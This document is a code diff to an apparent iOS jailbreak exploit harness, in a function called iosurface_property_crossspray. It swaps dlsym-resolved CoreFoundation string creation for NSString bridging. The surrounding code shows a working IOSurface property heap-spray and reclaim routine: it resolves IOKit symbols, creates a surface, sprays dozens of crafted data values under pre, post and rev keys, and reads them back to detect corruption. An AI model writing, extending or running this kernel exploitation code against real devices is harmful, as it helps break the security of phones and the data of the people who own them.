@@ -41570,7 +41570,8 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
 
         typedef void*(*cfdictcreate_fn)(void*, const void**, const void**, long, const void*);
         typedef void*(*cfnumcreate_fn)(void*, int, const void*);
-        typedef void*(*cfstrcreate_fn)(void*, const char*, int);
+        // Note: CFStringCreateWithCString via dlsym conflicts with module declaration in Xcode 26.6
+        // Use NSString bridging instead
         typedef void*(*cfdatacreate_fn)(void*, const uint8_t*, long);
         typedef long(*cfdatalen_fn)(void*);
         typedef const uint8_t*(*cfdataptr_fn)(void*);
@@ -41580,7 +41581,7 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
 
         cfdictcreate_fn sym_dictcreate = (cfdictcreate_fn)dlsym(RTLD_DEFAULT, "CFDictionaryCreate");
         cfnumcreate_fn sym_numcreate = (cfnumcreate_fn)dlsym(RTLD_DEFAULT, "CFNumberCreate");
-        cfstrcreate_fn sym_strcreate = (cfstrcreate_fn)dlsym(RTLD_DEFAULT, "CFStringCreateWithCString");
+        // sym_strcreate removed — using (__bridge void*)[NSString stringWithUTF8String:] instead
         cfdatacreate_fn sym_datacreate = (cfdatacreate_fn)dlsym(RTLD_DEFAULT, "CFDataCreate");
         cfdatalen_fn sym_datalen = (cfdatalen_fn)dlsym(RTLD_DEFAULT, "CFDataGetLength");
         cfdataptr_fn sym_dataptr = (cfdataptr_fn)dlsym(RTLD_DEFAULT, "CFDataGetBytePtr");
@@ -41590,7 +41591,7 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
 
         if (!sym_matching || !sym_getmatch || !sym_open || !sym_close || !sym_call || !sym_async ||
             !sym_surf_create || !sym_surf_getid || !sym_surf_setval || !sym_surf_copyval ||
-            !sym_dictcreate || !sym_numcreate || !sym_strcreate || !sym_datacreate ||
+            !sym_dictcreate || !sym_numcreate || !sym_datacreate ||
             !sym_datalen || !sym_dataptr || !sym_cfrelease || !sym_cfgettypeid || !sym_cfdatatypeid) {
             log(@"JB55: FAIL - dlsym missing symbols");
             results[@"verdict"] = @"DLSYM_FAIL";
@@ -41619,10 +41620,10 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
         }
 
         int w = 256, h = 256, bpe = 4;
-        void *wKey = sym_strcreate(NULL, "IOSurfaceWidth", 0x0600);
-        void *hKey = sym_strcreate(NULL, "IOSurfaceHeight", 0x0600);
-        void *bpeKey = sym_strcreate(NULL, "IOSurfaceBytesPerElement", 0x0600);
-        void *allocKey = sym_strcreate(NULL, "IOSurfaceAllocSize", 0x0600);
+        void *wKey = (__bridge void*)[NSString stringWithUTF8String:"IOSurfaceWidth"];
+        void *hKey = (__bridge void*)[NSString stringWithUTF8String:"IOSurfaceHeight"];
+        void *bpeKey = (__bridge void*)[NSString stringWithUTF8String:"IOSurfaceBytesPerElement"];
+        void *allocKey = (__bridge void*)[NSString stringWithUTF8String:"IOSurfaceAllocSize"];
         int allocSz = w * h * bpe;
         void *wVal = sym_numcreate(NULL, 9, &w);
         void *hVal = sym_numcreate(NULL, 9, &h);
@@ -41634,7 +41635,7 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
         void *surface = sym_surf_create(props);
         uint32_t surfID = surface ? sym_surf_getid(surface) : 0;
         sym_cfrelease(props);
-        sym_cfrelease(wKey); sym_cfrelease(hKey); sym_cfrelease(bpeKey); sym_cfrelease(allocKey);
+        // wKey, hKey, bpeKey, allocKey are bridged NSStrings — no CFRelease needed
         sym_cfrelease(wVal); sym_cfrelease(hVal); sym_cfrelease(bpeVal); sym_cfrelease(allocVal);
 
         log([NSString stringWithFormat:@"JB55: IOSurface created surfID=%u", surfID]);
@@ -41677,10 +41678,10 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
                 for (int i = 0; i < 32 && !isr_stopped(); i++) {
                     char keyBuf[32];
                     snprintf(keyBuf, sizeof(keyBuf), "jb55_pre_%02d", i);
-                    void *cfKey = sym_strcreate(NULL, keyBuf, 0x0600);
+                    void *cfKey = (__bridge void*)[NSString stringWithUTF8String:keyBuf];
                     void *cfVal = sym_datacreate(NULL, propData, 24);
                     sym_surf_setval(surface, cfKey, cfVal);
-                    sym_cfrelease(cfKey);
+
                     sym_cfrelease(cfVal);
                 }
 
@@ -41692,19 +41693,19 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
                 for (int i = 0; i < 64 && !isr_stopped(); i++) {
                     char keyBuf[32];
                     snprintf(keyBuf, sizeof(keyBuf), "jb55_post_%02d", i);
-                    void *cfKey = sym_strcreate(NULL, keyBuf, 0x0600);
+                    void *cfKey = (__bridge void*)[NSString stringWithUTF8String:keyBuf];
                     void *cfVal = sym_datacreate(NULL, reclaimData, 24);
                     sym_surf_setval(surface, cfKey, cfVal);
-                    sym_cfrelease(cfKey);
+
                     sym_cfrelease(cfVal);
                 }
 
                 for (int i = 0; i < 32 && !isr_stopped(); i++) {
                     char keyBuf[32];
                     snprintf(keyBuf, sizeof(keyBuf), "jb55_pre_%02d", i);
-                    void *cfKey = sym_strcreate(NULL, keyBuf, 0x0600);
+                    void *cfKey = (__bridge void*)[NSString stringWithUTF8String:keyBuf];
                     void *readVal = sym_surf_copyval(surface, cfKey);
-                    sym_cfrelease(cfKey);
+
                     if (readVal) {
                         s2_total++;
                         if (sym_cfgettypeid(readVal) == sym_cfdatatypeid()) {
@@ -41752,19 +41753,19 @@ void iosurface_property_crossspray(ISRLogBlock log, ISRDoneBlock done) {
                 for (int i = 0; i < 64 && !isr_stopped(); i++) {
                     char keyBuf[32];
                     snprintf(keyBuf, sizeof(keyBuf), "jb55_rev_%02d", i);
-                    void *cfKey = sym_strcreate(NULL, keyBuf, 0x0600);
+                    void *cfKey = (__bridge void*)[NSString stringWithUTF8String:keyBuf];
                     void *cfVal = sym_datacreate(NULL, fillData, 24);
                     sym_surf_setval(surface, cfKey, cfVal);
-                    sym_cfrelease(cfKey);
+
                     sym_cfrelease(cfVal);
                 }
 
                 for (int i = 0; i < 64 && !isr_stopped(); i++) {
                     char keyBuf[32];
                     snprintf(keyBuf, sizeof(keyBuf), "jb55_rev_%02d", i);
-                    void *cfKey = sym_strcreate(NULL, keyBuf, 0x0600);
+                    void *cfKey = (__bridge void*)[NSString stringWithUTF8String:keyBuf];
                     void *readVal = sym_surf_copyval(surface, cfKey);
-                    sym_cfrelease(cfKey);
+
                     if (readVal) {
                         s3_total++;
                         if (sym_cfgettypeid(readVal) == sym_cfdatatypeid()) {
